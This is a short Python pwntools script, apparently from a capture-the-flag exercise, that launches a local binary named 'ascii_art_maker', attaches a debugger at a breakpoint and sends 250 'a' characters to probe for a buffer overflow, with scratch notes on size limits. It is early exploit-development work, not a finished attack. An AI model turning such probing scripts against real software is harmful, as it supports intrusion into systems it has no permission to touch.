from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']

cn = process('./ascii_art_maker')
bin = ELF('./ascii_art_maker')

def z(ex=''):
	gdb.attach(cn,ex)
	#raw_input()


cn.recvuntil('Your Input: \n')
z('b*0x080489BC\nset follow-fork-mode parent\nc')#b*0x08048450
cn.sendline('a'*250)

cn.interactive()

'''
16 min
ba max
5d num
'''